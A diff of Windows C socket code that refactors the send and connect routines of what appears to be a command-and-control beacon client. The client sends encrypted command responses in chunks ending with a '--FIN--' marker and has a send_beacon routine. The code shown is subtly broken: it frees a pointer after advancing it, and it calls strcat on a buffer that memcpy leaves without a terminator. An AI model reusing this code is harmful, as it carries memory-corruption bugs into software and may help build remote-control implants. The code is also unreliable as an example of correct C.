@@ -366,44 +366,47 @@ void send_command(const char* response) {
         log_it("Encryption failed");
         return;
     }
-    log_it("Sending payload: %s", encrypted);
+    log_it("Sending data: %s", encrypted);
     size_t encrypted_len = strlen(encrypted);
-    if (encrypted_len >= CHUNK_SIZE) {
+    if (encrypted_len > CHUNK_SIZE) {
+        // Send the data in chunks
         while (encrypted_len > 0) {
             size_t chunk_size = (encrypted_len > CHUNK_SIZE) ? CHUNK_SIZE : encrypted_len;
-            char chunk[CHUNK_SIZE + 7]; // Additional space for '--FIN--' and null terminator
-            // Copy the chunk of data from encrypted
+            char chunk[CHUNK_SIZE + 7]; // Buffer for data chunk + '--FIN--' + null terminator
+
+            // Copy chunk of data
             memcpy(chunk, encrypted, chunk_size);
             encrypted += chunk_size;
             encrypted_len -= chunk_size;
+
             if (encrypted_len == 0) {
                 // Add termination marker for the last chunk
                 strcat(chunk, "--FIN--");
                 chunk_size += 7; // Increase chunk size to account for the '--FIN--' marker
             }
-            // Send chunk to the socket
+
+            // Send the chunk to the socket
             int result = send(client_socket, chunk, chunk_size, 0);
             if (result == SOCKET_ERROR) {
                 int error_code = WSAGetLastError();
                 log_it("Send failed with error: %d", error_code);
-                free(encrypted);
+                free(encrypted); // Free after sending all data
                 return;
             }
-            log_it("Sent Chunk: %.*s", (int)chunk_size, chunk);
+            log_it("Sent chunk successfully.");
         }
     } else {
         // If the encrypted data fits in one chunk
         int result = send(client_socket, encrypted, encrypted_len, 0);
         if (result == SOCKET_ERROR) {
             int error_code = WSAGetLastError();
-            fprintf(stderr, "Send failed with error: %d", error_code);
-            free(encrypted);
-            return;
+            log_it("Send failed with error: %d", error_code);
+        } else {
+            log_it("Sent data successfully.");
         }
-        // Log the sent data
-        log_it("Sent Data: %s", encrypted);
     }
-    free(encrypted);
+    
+    free(encrypted); // Free after sending all data
 }
 
 void send_beacon() {
@@ -843,7 +846,6 @@ int connect_to_server() {
     WSADATA wsaData;
     struct addrinfo *result = NULL, *ptr = NULL, hints;
     char port_str[6];
-    SOCKET client_socket = INVALID_SOCKET;
     int retry_count = 0;
 
     // Initialize Winsock
@@ -867,17 +869,15 @@ int connect_to_server() {
         WSACleanup();
         return -1;
     }
+
     // Attempt to connect to an address until one succeeds
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
-        // Create a SOCKET for connecting to server
         client_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
         if (client_socket == INVALID_SOCKET) {
             log_it("Socket creation failed with error: %ld", WSAGetLastError());
-            freeaddrinfo(result);
-            WSACleanup();
-            return -1;
+            continue; // Try the next address
         }
-        // Connect to server
+
         int connectResult = connect(client_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
         if (connectResult == SOCKET_ERROR) {
             closesocket(client_socket);
@@ -891,14 +891,14 @@ int connect_to_server() {
             retry_count++;
             continue;
         }
-        // Connection success
-        log_it("Client %s connected.", CVER);
 
-        // get peer information
+        log_it("Client connected.");
+
+        // Get peer information
         char* peer_ip = get_peer_info(client_socket);
         if (peer_ip) {
             strcpy(IP_ADDRESS, peer_ip);
-            log_it("IP Address: %s", IP_ADDRESS);  // Log the IP address
+            log_it("IP Address: %s", IP_ADDRESS);
         } else {
             log_it("Failed to get peer information.");
         }
@@ -922,7 +922,6 @@ int connect_to_server() {
 
     return 0;
 }
-
 
 int main() {
     log_file = fopen("client.log", "a");
